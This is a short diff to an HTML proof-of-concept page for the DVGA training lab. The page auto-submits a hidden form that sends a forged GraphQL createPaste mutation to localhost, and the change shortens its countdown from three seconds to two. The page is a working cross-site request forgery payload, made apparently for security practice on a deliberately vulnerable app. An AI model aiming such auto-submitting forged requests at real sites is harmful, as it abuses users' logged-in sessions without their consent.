@@ -1,7 +1,7 @@
 <!-- Ensure your DVGA is set to port 5013 on localhost! -->
 <html>
   <body>
-    <h1>This form is going to submit itself in 3 seconds...</h1>
+    <h1>This form is going to submit itself in 2 seconds...</h1>
      <form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql">
        <input type="hidden" name="query" value="mutation { createPaste(title:&quot;CSRF&quot;, content:&quot;content&quot;, public:true, burn: false) { paste { id content title burn } }}"/>
        <input type="submit" value="Submit">
@@ -14,7 +14,7 @@ function sleep(ms) {
 }
 
 async function csrf() {
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 2; i++) {
         await sleep(i * 1000);
     }
     document.forms['auto_submit_form'].submit();
